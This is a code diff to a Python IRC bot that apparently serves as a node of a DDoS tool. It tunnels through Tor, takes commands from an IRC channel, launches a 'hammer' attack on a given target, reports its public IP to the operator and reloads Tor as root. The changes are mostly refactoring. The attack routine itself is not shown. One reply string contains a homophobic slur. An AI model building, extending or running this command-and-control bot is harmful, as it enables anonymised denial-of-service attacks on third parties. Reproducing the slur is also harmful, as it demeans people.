@@ -3,12 +3,6 @@
 import platform
 import re
 import claudiashammer
-
-if(platform.system()=="Windows"): # Requests doesn't work on Windows
-    import urllib2
-else:
-    import requests
-
 import argparse
 import getpass
 import socks
@@ -23,9 +17,14 @@ import threading
 import string
 from Queue import Queue
 
+if platform.system() == "Windows": # Requests doesn't work on Windows
+    import urllib2
+else:
+    import requests
+
 # Aesthetics
 
-if(platform.system()=="Windows"): # Colors doesn't work on Windows
+if platform.system() == "Windows": # Colors doesn't work on Windows
     class bcolors:
         HEADER = ''
         OKBLUE = ''
@@ -121,37 +120,48 @@ time.sleep(1)
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
 okblue("v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND")
 
-if(platform.system()=="Windows"):
-    sport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9150) + "): ")
+if platform.system() == "Windows":
+    socksport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9150) + "): ")
 else:
-    sport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9050) + "): ")
+    socksport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9050) + "): ")
 
-if sport == "":
-    sport = 9050
-    if(platform.system()=="Windows"):
-        sport = 9150
+if socksport == "":
+    socksport = 9050
+    if platform.system() == "Windows" :
+        socksport = 9150
 else:
-    sport = int(sport)
+    socksport = int(socksport)
 
 
 native_ip = config["native_ip"]
 
+def getip():
+    if platform.system() == "Windows":
+        ip = str(urllib2.urlopen("http://canihazip.com/s").read())
+    else:
+        ip = requests.get("http://canihazip.com/s").text
+    return ip
+
 if native_ip == "0":
     warning(lang["unativeip"])
     time.sleep(2)
-    if(platform.system()=="Windows"):
-        native_ip = str(urllib2.urlopen("http://canihazip.com/s").read())
-    else:
-        native_ip = requests.get("http://canihazip.com/s").text
+    print(getip())
 
 print(lang["ynativeip"] + native_ip)
 
+if platform.system() != "Windows":
+    print("Username: " + getpass.getuser())
+    if getpass.getuser() != "root":
+        fail("Not root")
+    else:
+        okgreen("Root!")
+
 # Tor
-socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", sport, True)
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", socksport, True)
 socket.socket = socks.socksocket
 s = socks.socksocket()
 
-if(platform.system()=="Windows"):
+if platform.system() == "Windows":
     IP = str(urllib2.urlopen("http://canihazip.com/s").read())
 else:
     IP = requests.get("http://canihazip.com/s").text
@@ -198,7 +208,7 @@ try:
     s = ssl.wrap_socket(s)
     
 except Exception as e:
-    fail(lang["confailed"] + "[" + str(sport) + "]")
+    fail(lang["confailed"] + "[" + str(socksport) + "]")
     print(e)
     exit()
 
@@ -207,7 +217,7 @@ s.send("NICK " + nickname + "\r\n")
 s.send("USER " + username + " 0 * :" + realname + "\r\n")
 
 
-# Message-sending 
+# Message-sending
 def message(msg):
     s.send("PRIVMSG " + channel + " :" + msg + "\r\n")
     if msg == "Stopping the attack":
@@ -309,7 +319,7 @@ while 1:
         if sentmessage == "!test":
             time.sleep(1)
             message("Testing: v" + version)
-            s.send("PRIVMSG " + senderuser + " :" + IP + " @" + version + "\r\n")
+            s.send("PRIVMSG " + senderuser + " :" + getip() + " @" + version + "\r\n")
         if "!hammer" in sentmessage:
             if target is None:
                 attackdata = sentmessage.replace("!hammer ", "")
@@ -364,11 +374,18 @@ while 1:
         if ("ACTION pets "+nickname in sentmessage) or ("ACTION pets *" in sentmessage):
             message("purr")
         if sentmessage == "!reload":
-            if (socksport == 9050):
-                if getpass.getuser() != "root":
-                    message("Not root")
-                else:
-                    os.system("service tor reload")
-                    message("Reloading ...")
+            if platform.system() == "Windows":
+                message("I'm a Microfag!")
             else:
-                message("Not running :9050")
+                if (socksport == 9050):
+                    if getpass.getuser() != "root":
+                        message("Not root")
+                    else:
+                        os.system("service tor reload")
+                        message("Reloading ...")
+                else:
+                    message("Not running :9050")
+        if sentmessage == "Ahoy!":
+            message("Ohai " + auth + "!")
+        if sentmessage == "Ahoy " + nickname + "!":
+            message("Ohai " + auth + "!")
